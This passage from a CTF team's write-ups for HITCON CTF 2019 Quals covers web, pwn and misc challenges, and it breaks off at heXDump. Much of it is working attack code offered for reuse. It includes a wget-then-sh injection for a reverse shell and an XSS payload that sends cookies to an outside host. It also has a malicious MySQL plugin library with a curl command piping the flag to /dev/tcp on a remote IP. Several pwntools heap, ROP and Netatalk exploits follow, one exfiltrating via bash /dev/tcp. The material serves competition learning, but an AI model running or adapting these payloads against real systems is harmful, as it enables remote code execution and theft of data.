---
title: "hitconctfquals writeups"
category: "crypto"
subcategory: "discrete-log"
type: "writeup"
tags: ["crypto", "discrete-log", "xss", "eval", "mysql", "redis", "cgi", "reverse-shell"]
summary: "It's recommended to read our responsive web version of this writeup."
source:
  name: "balsn/ctf_writeup"
  url: "https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20191012-hitconctfquals/README.md"
ctf:
  name: "hitconctfquals"
  year: 2019
---

## Source

- **CTF:** hitconctfquals 2019
- **Repository:** [balsn/ctf_writeup](https://github.com/balsn/ctf_writeup)
- **File:** <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20191012-hitconctfquals/README.md>

---
# HITCON CTF 2019 Quals

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20191012-hitconctfquals/) of this writeup.**


 - [HITCON CTF 2019 Quals](#hitcon-ctf-2019-quals)
   - [Web](#web)
     - [Virtual Public Network](#virtual-public-network)
     - [Bounty Pl33z](#bounty-pl33z)
     - [GoGo PowerSQL](#gogo-powersql)
       - [Failed Attempts](#failed-attempts)
     - [Luatic](#luatic)
       - [Overwrite varibles](#overwrite-varibles)
       - [Redis and Lua](#redis-and-lua)
     - [Buggy .NET](#buggy-net)
   - [Pwn](#pwn)
     - [PoE - I](#poe---i)
     - [EmojiiiVM](#emojiiivm)
     - [Netatalk](#netatalk)
     - [<g-emoji class="g-emoji" alias="jack_o_lantern" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f383.png">🎃</g-emoji> Trick or Treat <g-emoji class="g-emoji" alias="jack_o_lantern" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f383.png">🎃</g-emoji>](#-trick-or-treat-)
     - [LazyHouse](#lazyhouse)
     - [One Punch Man](#one-punch-man)
     - [Crypto in the Shell](#crypto-in-the-shell)
   - [Misc](#misc)
     - [Revenge of Welcome](#revenge-of-welcome)
     - [EV3 Player](#ev3-player)
     - [heXDump](#hexdump)
     - [EmojiVM](#emojivm)
   - [Rev](#rev)
     - [EV3 Arm](#ev3-arm)
     - [EmojiVM](#emojivm-1)
     - [Core Dumb](#core-dumb)
     - [Suicune](#suicune)
   - [Crypto](#crypto)
     - [Lost Modulus Again](#lost-modulus-again)
     - [Lost Key Again](#lost-key-again)
     - [Very simple haskell](#very-simple-haskell)


## Web

### Virtual Public Network

`-r$x="wget kaibro.tw/yy -O /tmp/kaibro",system$x# 2>./tmp/kaibro.thtml <`

`-r$x="sh /tmp/kaibro",system$x# 2>./tmp/kaibro.thtml <`

then get reverse shell back.

`/$READ_FLAG$`

=> `hitcon{Now I'm sure u saw my Bl4ck H4t p4p3r :P}`

### Bounty Pl33z

This is a XSS challenge. The source code is [here](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2019/bounty-pl33z/www/fd.php). For quotes, if they appear more than once, they will be removed.

The most tricky part is if the string we inject includes a double quote. For example, `"+alert(1)`

```
window.parent.postMessage(
                data, 
"https://"+alert(1)".orange.ctf"
);
```

Undoubtedly the `orange.ctf"` will throw syntax error.

At that time, I could not come out of any useful payload to comment out `orange.ctf"`. Therefore I decided to fuzz/brute-force 3 characters:

```javascript
  for (let j = 0; j < 128; j++) {
    for (let k = 0; k < 128; k++) {
      for (let l = 0; l < 128; l++) {
        if (j == 34 || k ==34 || l ==34)
          continue;
        if (j == 0x0a || k ==0x0a || l ==0x0a)
          continue;
        if (j == 0x0d || k ==0x0d || l ==0x0d)
          continue;
        if (j == 0x3c || k ==0x3c || l ==0x3c)
          continue;
        if (
           (j == 47 && k == 47)
           ||(k == 47 && l == 47)
          )
          continue;
    try {
        var cmd = String.fromCharCode(j) + String.fromCharCode(k) + String.fromCharCode(l) + 'a.orange.ctf"';
        eval(cmd);
    } catch(e) {
        var err = e.toString().split('\n')[0].split(':')[0];
        if (err === 'SyntaxError' || err === "ReferenceError")
          continue
        err = e.toString().split('\n')[0]
    }
       console.log(err,cmd);
    }
    }
  }
```

The output really surprised me. The following are all valid js comment syntax:

```
#!a.orange.ctf"
-->a.orange.ctf"
```

The first [shebang syntax](https://github.com/tc39/proposal-hashbang) has to be in the start of the js, which means it is not very useful in this challenge.

However, the second one is interesting. This seems to be [a valid comment syntax](https://www.ecma-international.org/ecma-262/10.0/index.html#prod-annexB-HTMLCloseComment) in ECMA. Well.... it's javascript!

There is still one problem. The `-->` comment syntax must be the start of the line, but `\n\r` are all filtered. I start to wonder there exists an unicode newline or not, and I find this [stackoverflow](https://stackoverflow.com/questions/50156996/replace-n-with-unicode-to-display-new-line-in-html-correctly) post.

Anyway, let's fuzz/brute-force again!

```javascript
  for (let j = 0; j < 65536; j++) {
    try {
        var cmd = '"aaaaa";'+String.fromCharCode(j) + '-->a.orange.ctf"';
        eval(cmd);
    } catch(e) {
        var err = e.toString().split('\n')[0].split(':')[0];
        if (err === 'SyntaxError' || err === "ReferenceError")
          continue;
        err = e.toString().split('\n')[0]
    }
    console.log(`[${err}]`,j,cmd);
  }
```

`charCode(8233)` and `charCode(8233)` will be parsed as newline in javascript.

This payload can pop an alert: `http://3.114.5.202/fd.php?q="%2balert(1)%e2%80%a8-->`

The final payload:

```
http://3.114.5.202/fd.php?q=%22%2bfetch(atob(`Ly8xMzMuMjIxLjMzMy4xMjM6MTIzNC8/YT0K`)%2bbtoa(document%5B%60cookie%60%5D))%e2%80%a8--%3E
```
The flag is `hitcon{/FD 1s 0ur g0d <(_ _)>}`.

Actually, I was also playing with parentheses and template literal (backtick), but I failed to create a successful payload. To my surprise, there is actually an unintended solution exploiting parentheses. Check out [terjanq's](https://twitter.com/terjanq/status
/1183633977455861760) payload, or [this one](https://github.com/orangetw/My-CTF-Web-Challenges#unintended-solution).

Fun fact: The idea seems to be from a challenge in [Cure53 XSS wiki](https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#level-8), and the first author [filedescriptor (fd)](https://twitter.com/filedescriptor) is working in Cure53.


### GoGo PowerSQL

The sever is running [GoAhead v4.0.0](https://github.com/embedthis/goahead) + CGI + mysql. The CGI program will read MySQL host ip from a config file, and there is a BSS overflow which we can overwrite the MySQL host ip. However, the characters are limited in alphabets only. Therefore we decided to exploit the webserver itself.

We checked the [CVE-2017-17562](https://github.com/embedthis/goahead/issues/262) on older GoAhead webservers. There is also a [good article](https://www.elttam.com.au/blog/goahead/) describing this vulnerability. Although it's fixed on 4.0.0, reading it should help me exploit this webserver. Surprising we found "the fix" was just [filtering a bunch of sensitive environment variables](https://github.com/embedthis/goahead/blob/32deeb00a106f3d1a7bdc21671123d97f05378b6/src/cgi.c#L168-L177).

However, the CGI executable uses `libmysqlclient`. It's possible that we can pollute some environment variable to reach RCE via mysql library. After browsing the [MySQL 5.7 doc](https://dev.mysql.com/doc/refman/5.7/en/environment-variables.html), one of them catches my eyes.

```
LIBMYSQL_PLUGINS 	Client plugins to preload.
```

And it turns out that it can load `.so` library as plugins. I quickly made a simple RCE hook in C:

```
// gcc -shared -fPIC cmd.c -o cmd.so

#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>


extern char** environ;

__attribute__ ((__constructor__)) void preload (void)
{
    system(getenv("CMD"));
}
```

We can easily RCE through the commands. Basically it's similar to `LD_PRELOAD`.

```
CMD="yes" LIBMYSQL_PLUGIN_DIR=`pwd` LIBMYSQL_PLUGINS="cmd.so" QUERY_STRING="name=a" ./query
```
(`QUERY_STRING` is the GET parmeters passing to the CGI executable `query`)


Also, based on the exploit of [CVE-2017-17562](https://www.elttam.com.au/blog/goahead/), we could probably use `/proc/self/fd/0` to upload our malicious library.

However, MySQL library will always append `.so` on the name of plugins. So if the plugin is named `foo`, it will load `foo.so` from the directory specified. We stuck here for a few hours and we can't find a way to bypass this.

Until I read [mysql source code](https://github.com/mysql/mysql-server/blob/4869291f7ee258e136ef03f5a50135fe7329ffb9/sql-common/client_plugin.cc#L442):

```cpp
int FN_REFLEN = 512;
char dlpath[FN_REFLEN + 1];
strxnmov(dlpath, sizeof(dlpath) - 1, plugindir, "/", name, ".so", NullS);

char *strxnmov(char *dst, size_t len, const char *src, ...) {
  va_list pvar;
  char *end_of_dst = dst + len;

  va_start(pvar, src);
  while (src != NullS) {
    do {
      if (dst == end_of_dst) goto end;
    } while ((*dst++ = *src++));
    dst--;
    src = va_arg(pvar, char *);
  }
end:
  *dst = 0;
  va_end(pvar);
  return dst;
}
```

Thanks to this, if the filepath is more than 512 bytes, `.so` will get truncated.

```shell
curl -X POST --data-binary @./cmd.so 'http://13.231.38.172/cgi-bin/query?LIBMYSQL_PLUGIN_DIR=//proc/self/fd&LIBMYSQL_PLUGINS=././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././0&CMD=bash%20-c%20%22cat%20/F*>/dev/tcp/133.221.333.123/12345%22'
```

The flag: `hitcon{Env1r0nm3nt 1nj3ct10n r0cks!!!}`

This seems to be the unintended RCE solution (I knew some other teams also developed this exploit.). According to [the author's writeup (Orange)](https://github.com/orangetw/My-CTF-Web-Challenges#gogo-powersql), the intended way is polluting `LOCALDOMAIN` and overwriting mysql host to read arbitrary file from the client using a rogue MySQL server.

Everything is possible if you check the source code.


#### Failed Attempts
- snprintf overwrite: The SQL query is built using snprintf, but we can overwrite the last single quote here. The query will become `select * from users where name like '%aaaaaa%` which leads to SQL error. However, this is useless......
- Using GoAhead 1-day or CVEs: like embedthis/goahead Issue [264](https://github.com/embedthis/goahead/issues/264) and [285](https://github.com/embedthis/goahead/issues/285), but I feel like they are not actually exploitable. (and I don't have any pwn skills)
- brute-force the temp filename to become `foobar.so`: The webserver will create a tempfile for stdio/out. However, the filename, especially the extension, is not controllable. Check the [source code](https://github.com/embedthis/goahead/blob/029ea72c871f1dced9e9a7bd1ff9cc0a003fd4ca/src/osdep.c#L66) here.
- Using existing library `*.so` on the server with environment variables to RCE: The only interesting library is `libmemusage`. Loading this library shows the memory usage of the program. However they don't seem to be useful here.

### Luatic

The server source code is [here](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2019/luatic/luatic.php).

Each team in this CTF will be assigned a unique token, which can be used in this challenge to create an independent Redis server.

#### Overwrite varibles

The first part is to overwrite PHP varibles. Let's focus on this code:

```php
    foreach($_REQUEST as $k=>$v) {
        if( strlen($k) > 0 && preg_match('/^(FLAG|MY_|TEST_|GLOBALS)/i',$k)  )
            exit('Shame on you');
    }
    
    foreach(Array('_GET','_POST') as $request) {
        foreach($$request as $k => $v) ${$k} = str_replace(str_split("[]{}=.'\""), "", $v);
    }
```

It will extract GET and POST parameters and simply create a PHP varaible and assign to it. However, the annoying WAF will block any attempt to create any varaible starting with `MY_`. @kaibro found the trick here: the for-each loop firstly parses `_GET` and then `_POST`. What if we name our varaible as `_POST` and put it in `_GET`? It will parse this one in `_GET`  and add our varaible into `_POST`!

```
example.com/?_POST[guess]=123

# First, parse $_GET
$_POST = Array("guess" => 123);

# Second, parse $_POST, which has been overwritten previously
$guess = 123;
```


[Reference (in Simplified Chinese)](https://xz.aliyun.com/t/5676#toc-4).

#### Redis and Lua

Thus, we can control the `$MY_SET_COMMAND` now. The next target is the redis server and Lua interpreter. We have to somehow find an approach to predict the random value.

The PHP code seems to use [phpredis](https://github.com/phpredis/phpredis) library. We could probably inject command in `rawCommand` function call, but our objective is in the Lua interpreter.

Let's gather some information for this Lua interpreter in Redis.

1. [Redis uses the same Lua interpreter to run all the commands.](https://redis.io/commands/eval#atomicity-of-scripts) 
2. sandboxing: Lua interpreter in Redis [is sandboxed](https://redis.io/commands/eval#sandbox-and-maximum-execution-time). The [available modules](https://redis.io/commands/eval#available-libraries) are pretty limited. RCE will be difficult.
3. [replication](https://redis.io/commands/eval#scripts-as-pure-functions): The Lua script has to be a stateless pure function. It should not depend on any internal state. Basically what redis want is the Lua script should return the same value for each call.
4. [not allow global varaibles](https://redis.io/commands/eval#global-variables-protection): This is a similar mechanism as the previous one. You should not keep state inside the Lua engine.

Even with those limitations, we still try to overwrite `math.random` function call. After some searching I got [this](https://stackoverflow.com/questions/19997647/script-attempted-to-create-global-variable), so I think if it's possible to create a global variable, it should not be hard to overwrite one.

Therefore, we just overwrite `math.random` like this in redis.

```
eval "function math:random() return 87 end" 0
```

Here is the final payload. Because the server will check if the key exists in redis or not, we have to set that one in redis first:

```
http://54.250.242.183/luatic.php?token=mytoken&_POST[guess]=87&_POST[TEST_KEY]=function%20math%3Arandom()%20return%2087%20end&_POST[TEST_VALUE]=0
```

Then overwrite the function. The return value will be fixed.

```
http://54.250.242.183/luatic.php?token=052e31ea-dc02-48ea-8e76-e277c4b03c60&_POST[guess]=87&_POST[MY_SET_COMMAND]=eval&_POST[TEST_KEY]=function%20math%3Arandom()%20return%2087%20end&_POST[TEST_VALUE]=0
```

Flag: `hitcon{Lua^H Red1s 1s m4g1c!!!}`


### Buggy .NET

flag is in the `C:\FLAG.txt`

Thus we need to bypass `..` restriction to read files.

And in one year ago, I have read @irsdl's .NET WAF Bypass slide: https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour

The example code in the slide is almost same as this challenge. 

We just need to throw an exception when we use `Request.Form["filename"]` first time.

But I tried a lot of charset tricks (IBM500, IBM037, ...) and it never throw any exception.

So I started to read the .NET source code, and I found that we should use some malicious payload (e.g. XSS) to trigger the Request Validation exception.

(The function calling chain looks like: `Form.get` -> `ValidateHttpValueCollection` -> `collection.EnableGranularValidation` -> `ValidateString` -> `RequestValidator.Current.IsValidRequestString` -> `rossSiteScriptingValidation.IsDangerousString` -> `throw new HttpRequestValidationException`)

And it validated the Form data only once, so it will not throw any exception when we called it in the second time.

```
public NameValueCollection Form {
    get {
        EnsureForm();

        if (_flags[needToValidateForm]) {
            _flags.Clear(needToValidateForm);
            ValidateHttpValueCollection(_form, RequestValidationSource.Form);
        }

        return _form;
    }
}
```

Here is my exploit script:

```python
from pwn import *
import urllib

encoding = "utf-8"

r = remote("52.197.162.211", 80)

s = 'filename'
print(s)
res1 = (urllib.quote_plus(s.encode(encoding)))
l1 = len(res1)

#s = 'web.config'
s = '../../../../FLAG.txt'
print(s)
res2 = (urllib.quote_plus(s.encode(encoding)))
l2 = len(res2)

print(res1 + "=" + res2)
print("Length: ", l1 + l2 + 1)

s = "<script>alert(123)</script>"
shit = "&x=" + urllib.quote_plus(s.encode(encoding))

payload = '''GET / HTTP/1.1
Host: 52.197.162.211
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}'''.format(l1 + l2 + 1 + len(shit), res1 + "=" + res2 + shit).replace("\n", "\r\n")


r.send(payload)

r.interactive()
```

`hitcon{Amazing!!! @irsdl 1s ind33d the .Net KING!!!}`

## Pwn

### PoE - I

* https://github.com/yuawn/CTF/blob/master/2019/hitcon/PoE/poe-I.py


### EmojiiiVM
* https://github.com/yuawn/CTF/tree/master/2019/hitcon/EmojiiiVM

```python=
#!/usr/bin/env python3
#from pwn import *
import re

# hitcon{H0p3_y0u_Enj0y_pWn1ng_th1S_3m0j1_vM_^_^b}

'''
store [i] [j] [top]
load  top = mem[i][j]
'''

num = [ '😀' , '😁', '😂' , '🤣' , '😜' , '😄' , '😅' , '😆' , '😉' , '😊' , '😍' ]

def push( n ):
    if n <= 10:
        return '⏬' + num[n]
    else:
        return  mul( n // 10 , 10 ) + add( n % 10 , -1 )

def add( a , b , top = False ):
    if b < 0:
        return push( a ) + '➕'
    else:
        return push( b ) + push( a ) + '➕'

def sub( a , b ):
    if b == -1:
        return push( b ) + push( a ) + '➖'
    return push( b ) + push( a ) + '➖'

def mul( a , b ):
    if b == -1:
        return push( a ) + '❌'
    return push( b ) + push( a ) + '❌'

def store( i , j , v ):
    if v == -1:
        return push(j) + push(i) + '📥'
    if type(v) == type('y'):
        v = ord( v )
    return push(v) + push(j) + push(i) + '📥'

def load( i , j ):
    return push(j) + push(i) + '📤'

now = '\0' * 10

def store_str( i , s ):
    p = ''
    for j in range( len( s ) ):
        if now[j] == s[j]:
            continue
        p += store( i , j , s[j] )
    return p

def read( i ):
    return push( i ) + '📄'

def wri( i ):
    return push( i ) + '📝'

pop = '🔝'
wri_stk = '🔡'
puti = '🔢'

p = ''
p += ( push( 10 ) + '🆕' ) * 6
p += '➕'
p += pop * 9
p += add( 10 , -1 ) * 15 # 3 control 1
p += add( 2 , -1 )
p += pop * 20
p += puti
p += read( 3 )
p += read( 1 )
p += push( 10 ) + '🆕'
p += '🛑'

o = open( 'exp' , 'w+' )
o.write( p )
o.close()
```

### Netatalk


```python=
from pwn import *
import struct

#context.log_level = "error"
#ip = 'localhost'
ip = '3.114.63.117'
port = 48763
def create_header(addr):
    dsi_opensession = "\x01" # attention quantum option
    dsi_opensession += chr(len(addr)+0x10) # length
    dsi_opensession += "b"*0x10+addr
    dsi_header = "\x00" # "request" flag
    dsi_header += "\x04" # open session command
    dsi_header += "\x00\x01" # request id
    dsi_header += "\x00\x00\x00\x00" # data offset
    dsi_header += struct.pack(">I", len(dsi_opensession))
    dsi_header += "\x00\x00\x00\x00" # reserved
    dsi_header += dsi_opensession
    return dsi_header

def create_afp(idx,payload):
    afp_command = chr(idx) # invoke the second entry in the table
    afp_command += "\x00" # protocol defined padding 
    afp_command += payload
    dsi_header = "\x00" # "request" flag
    dsi_header += "\x02" # "AFP" command
    dsi_header += "\x00\x02" # request id
    dsi_header += "\x00\x00\x00\x00" # data offset
    dsi_header += struct.pack(">I", len(afp_command))
    dsi_header += '\x00\x00\x00\x00' # reserved
    dsi_header += afp_command
    return dsi_header

#addr = p64(0x7f9159232000-0x5357000)[:6] # brutefore address
addr = p64(0x7f812631d000)[:6]
#addr = ""
while len(addr)<6 :
    for i in range(256):
        r = remote(ip,port)
        r.send(create_header(addr+chr(i)))
        try:
            if "a"*4 in r.recvrepeat(1):
                addr += chr(i)
                r.close()
                break
        except:
            r.close()
    val = u64(addr.ljust(8,'\x00'))
    print hex(val)
addr += "\x00"*2
offset = 0x5246000
r = remote(ip,port)
libc = u64(addr)+offset
#libc=0x7fea3340b120-0x43120 # local libc offset
#print hex(libc)
#print hex(libc+0x3ed8e8)
#print hex(libc+0x3f04a8) # dl_open_hook
#print hex(libc+0x7EA1F)
#print hex(libc+0x166488)
#print hex(libc+0x4f440)
#raw_input()
#libc=0x7fea3340b120-0x43120
#setcontext+53



r.send(create_header(p64(libc+0x3ed8e8-0x30))) #  overwrite afp_command buf with free_hook-0x30 
context.arch = "amd64"

r8=0
r9=1
r12=1
r13=1
r14=1
r15=1
rdi=libc+0x3ed8e8+8 # cmd buffer
rsi=0x1111
rbp=0x1111
rbx=0x1111
rdx=0x1211
rcx=0x1211
rsp=libc+0x3ed8e8
rspp=libc+0x4f440 # system
payload2=flat(
r8,r9,
0,0,r12,r13,r14,r15,rdi,rsi,rbp,rbx,rdx,0,rcx,rsp,rspp
)
rip="X.X.X.X"
rport=11112
cmd='bash -c "cat /home/ctf/flag > /dev/tcp/%s/%d" \x00' % (rip,rport) # cat flag to controled ip and port 
payload = flat("\x00"*0x2e+p64(libc+0x166488)+cmd.ljust(0x2bb8,"\x00")+p64(libc+0x3f04a8+8)+p64(libc+0x7EA1F)*4+p64(libc+0x52070+53)+payload2) #over write _free_hook and _dl_open_hook
r.send(create_afp(0,payload))
r.send(create_afp(18,flat(
    ""
)))
        

r.interactive()
```
### 🎃 Trick or Treat 🎃
```python
from pwn import *

#r = process(["./trick_or_treat"])

r = remote("3.112.41.140", 56746)
r.sendlineafter(":",str(0x1000000))
r.recvuntil(":")
libc = int(r.recvline(),16)+0x1000ff0
print hex(libc)
offset = 0x1000ff0
r.sendlineafter(":",hex((offset+0x3ed8e8)/8))
r.sendline(" "+hex(libc+0x4f440))
r.sendafter(":","a"*0x400)
r.sendline("")
r.sendline("ed")
r.sendline("!sh")
r.interactive()
```

### LazyHouse
```python
from pwn import *

#r = process(["./lazyhouse"])
r = remote("3.115.121.123", 5731)
def buy(idx,size,house):
    r.sendlineafter(":","1")
    r.recvuntil(":")
    r.sendlineafter(":",str(idx))
    r.sendlineafter(":",str(size))
    r.recvuntil(":")
    if size < 0xffffffff:
        r.sendafter(":",house)

def show(idx):
    r.sendlineafter(":","2")
    r.sendlineafter(":",str(idx))

def remove(idx):
    r.sendlineafter(":","3")
    r.sendlineafter(":",str(idx))


def Upgrade(idx,house):
    r.sendlineafter(":","4")
    r.sendlineafter(":",str(idx))
    r.sendafter(":",house)

def Super(house):
    r.sendlineafter(":","5")
    r.sendafter(":",house)



buy(0,84618092081236480,"a")
remove(0)
buy(0,0x80,"a")
buy(1,0x500,"a")
buy(2,0x80,"a")
remove(1)
buy(1,0x600,"a")
Upgrade(0,"\x00"*0x88+p64(0x513))
buy(7,0x500,"a")
show(7)
data = r.recvn(0x500)
libc =  u64(data[0x8:0x10])-0x1e50d0
heap = u64(data[0x10:0x18])-0x2e0
print hex(libc)
print hex(heap)

remove(0)
remove(1)
remove(2)
size = 0x1a0+0x90
target = heap+0x8b0
buy(6,0x80,"\x00"*8+p64(size+1)+p64(target-0x18)+p64(target-0x10)+p64(target-0x20))
buy(5,0x80,"a")
buy(0,0x80,"a")
buy(1,0x80,"a")
buy(2,0x600,"\x00"*0x508+p64(0x101))
Upgrade(1,"\x00"*0x80+p64(size)+p64(0x610))
remove(2)
context.arch = "amd64"
size = 0x6c0
buy(2,0x500,"\x00"*0x78+flat(size+1,[0]*17)+
        flat(0x31,[0]*5,0x61,[0]*11,0x21,[0]*3,0x71,[0]*13))
remove(0)
remove(1)
remove(2)


buy(0,0x1a0,p64(0)*15+p64(0x6c1))
buy(1,0x210,"a")

buy(2,0x210,"a")
remove(2)
buy(2,0x210,"\x00"*0x148+p64(0xd1))
remove(2)
for i in range(5):
    buy(2,0x210,"a")
    remove(2)

buy(2,0x3a0,"a")
remove(2)


remove(1)
buy(1,0x220,"a")
remove(5)
buy(5,0x6b0,"\x00"*0xa0+p64(heap+0x40)+"\x00"*0x80+p64(0x221)+p64(libc+0x1e4eb0)+p64(heap+0x40))
remove(1)
buy(1,0x210,"a"*0x18+flat(
"/home/lazyhouse/flag".ljust(0x20,"\x00"),
libc+0x26542,heap+0xa88-0x20,libc+0x26f9e,0,libc+0x47cf8,2,libc+0x00cf6c5,
libc+0x26542,0x3,libc+0x26f9e,heap,libc+0x12bda6,0x100,libc+0x47cf8,0,libc+0x00cf6c5,
libc+0x26542,0x1,libc+0x26f9e,heap,libc+0x12bda6,0x100,libc+0x47cf8,1,libc+0x00cf6c5,
libc+0x36784
))
buy(2,0x210,p64(0)*0x20+p64(libc+0x1e4c30))
Super(p64(libc+0x0058373)+"z"*0x200)
remove(1)

buy(1,heap+0xa80,"a")

r.interactive()
```

### One Punch Man
```python=
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '52.198.120.1'
port = 48763

binary = "./one_punch"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def name(index, name):
  r.recvuntil("> ")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline(str(index))
  r.recvuntil(": ")
  r.send(name)
  pass

def rename(index,name):
  r.recvuntil("> ")
  r.sendline("2")
  r.recvuntil(": ")
  r.sendline(str(index))
  r.recvuntil(": ")
  r.send(name)

  pass

def d(index):
  r.recvuntil("> ")
  r.sendline("4")
  r.recvuntil(": ")
  r.sendline(str(index))
  pass

def show(index):
  r.recvuntil("> ")
  r.sendline("3")
  r.recvuntil(": ")
  r.sendline(str(index))

def magic(data):
  r.recvuntil("> ")
  r.sendline(str(0xc388))
  time.sleep(0.1)
  r.send(data)

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  name(0,"A"*0x210)
  d(0)
  name(1,"A"*0x210)
  d(1)
  show(1)
  r.recvuntil(" name: ")
  heap = u64(r.recv(6).ljust(8,"\x00")) - 0x260
  print("heap = {}".format(hex(heap)))
  for i in xrange(5):
    name(2,"A"*0x210)
    d(2)
  name(0,"A"*0x210)
  name(1,"A"*0x210)
  d(0)
  show(0)
  r.recvuntil(" name: ")
  libc = u64(r.recv(6).ljust(8,"\x00")) - 0x1e4ca0
  print("libc = {}".format(hex(libc)))
  d(1)
  rename(2,p64(libc + 0x1e4c30))

  name(0,"D"*0x90)
  d(0)
  for i in xrange(7):
    name(0,"D"*0x80)
    d(0)
  for i in xrange(7):
    name(0,"D"*0x200)
    d(0)


  name(0,"D"*0x200)
  name(1,"A"*0x210)
  name(2,p64(0x21)*(0x90/8))
  rename(2,p64(0x21)*(0x90/8))
  d(2)
  name(2,p64(0x21)*(0x90/8))
  rename(2,p64(0x21)*(0x90/8))
  d(2)



  d(0)
  d(1)
  name(0,"A"*0x80)
  name(1,"A"*0x80)
  d(0)
  d(1)
  name(0,"A"*0x88 + p64(0x421) + "D"*0x180 )
  name(2,"A"*0x200)
  d(1)
  d(2)
  name(2,"A"*0x200)
  rename(0,"A"*0x88 + p64(0x421) + p64(libc + 0x1e5090)*2 + p64(0) + p64(heap+0x10) )
  d(0)
  d(2)
  name(0,"/home/ctf/flag\x00\x00" + "A"*0x1f0)
  magic("A")
  add_rsp48 = libc + 0x000000000008cfd6
  pop_rdi = libc + 0x0000000000026542
  pop_rsi = libc + 0x0000000000026f9e
  pop_rdx = libc + 0x000000000012bda6
  pop_rax = libc + 0x0000000000047cf8
  syscall = libc + 0xcf6c5
  magic( p64(add_rsp48))
  name(0,p64(pop_rdi) + p64(heap + 0x24d0) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall) +
      p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x100) + p64(pop_rax) + p64(0) + p64(syscall) +
      p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x100) + p64(pop_rax) + p64(1) + p64(syscall)
      )
r.interactive()

```


### Crypto in the Shell

```python=
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from pwn import *
import sys
import time
import random
host = '3.113.219.89'
port = 31337

binary = "./chall"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def e(offset,size):
  r.recvuntil("ffset:")
  r.sendline(str(offset))
  r.recvuntil(":")
  r.sendline(str(size))
  pass

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  e(-32,15) # overwirte key & get key
  key = r.recv(16)
  aes = AES.new(key, AES.MODE_CBC, "\x00"*16)

  e(-64,15) # leak libc
  sec = r.recv(16)
  data = aes.decrypt(sec)
  libc = u64(data[:8].ljust(8,"\x00")) - 0x3ec680
  print("libc = {}".format(hex(libc)))
  e(-928,15) # leak code
  sec = r.recv(16)
  aes = AES.new(key, AES.MODE_CBC, "\x00"*16)
  data = aes.decrypt(sec)
  print repr(data)
  code = u64(data[8:].ljust(8,"\x00")) - 8 + 0x3A0
  print("code = {}".format(hex(code)))
  env_ptr = libc + 0x3ee098
  e(env_ptr - code, 15) # leak stack
  sec = r.recv(16)
  aes = AES.new(key, AES.MODE_CBC, "\x00"*16)
  data = aes.decrypt(sec)
  print repr(data)
  #stack = u64(data[:8].ljust(8,"\x00")) # local
  stack = u64(data[:8].ljust(8,"\x00")) + 8  # remote
  print("stack = {}".format(hex(stack)))
  wanto = stack - 0x130
  e(wanto-code,1) # overwrite loop i (bypass 32 round)

  magic = p64(libc + 0x4f2c5)

  for i in xrange(8): # modify retrun address to one_gadget
    print i
    wanto = stack - 0xf8 + i
    e(wanto-code,1)
    sec = r.recv(16)
    j=0
    while 1:
      aes = AES.new(key, AES.MODE_CBC, "\x00"*16)
      sec = aes.encrypt(sec)
      j+=1
      if sec[0] == magic[i]:
        for k in xrange(j):
          r.sendline(str(wanto-code))
          r.sendline(str(1))
        for k in xrange(j):
          r.recvuntil("ffset:")
        break
  for i in xrange(8): # modify envrion ptr to null
    print i
    wanto = env_ptr + i
    e(wanto-code,1)
    sec = r.recv(16)
    j=0
    while 1:
      aes = AES.new(key, AES.MODE_CBC, "\x00"*16)
      sec = aes.encrypt(sec)
      j+=1
      if sec[0] == '\x00':
        for k in xrange(j):
          r.sendline(str(wanto-code))
          r.sendline(str(1))
        for k in xrange(j):
          r.recvuntil("ffset:")
        break
  r.sendline("l") # exit main
  r.sendline("ls") # get shell
  r.interactive()

```

## Misc

### Revenge of Welcome

The challenge is to escape vim easy mode

`<C-l>:q!`
`<C-o>:q!`

flag : `hitcon{accidentally enter vim -y and can't leave Q_Q}`

### EV3 Player

Use wireshark to open the pklg file.

And install this plugin in wireshark.
https://github.com/ev3dev/lms-hacker-tools/tree/master/EV3

You would see these rsf file in the pklg.

```
../prjs/SD_Card/project/fl.rsf
../prjs/SD_Card/project/ag.rsf
```

Extract these two rsf from the pklg(I complete this step manually)

Install the LEGO Mindstorms to open the rsf sound file.

https://education.lego.com/en-us/downloads/mindstorms-ev3/software

![](https://i.imgur.com/hstSAQH.png)

And you can hear the flag:

`hitcon{playsoundwithlegomindstormsrobot}`



### heXDump

```
IO.popen("xxd -r -ps - #{@file}", 'r+') do |f|
    f.puts data
    f.close_write
  end
```

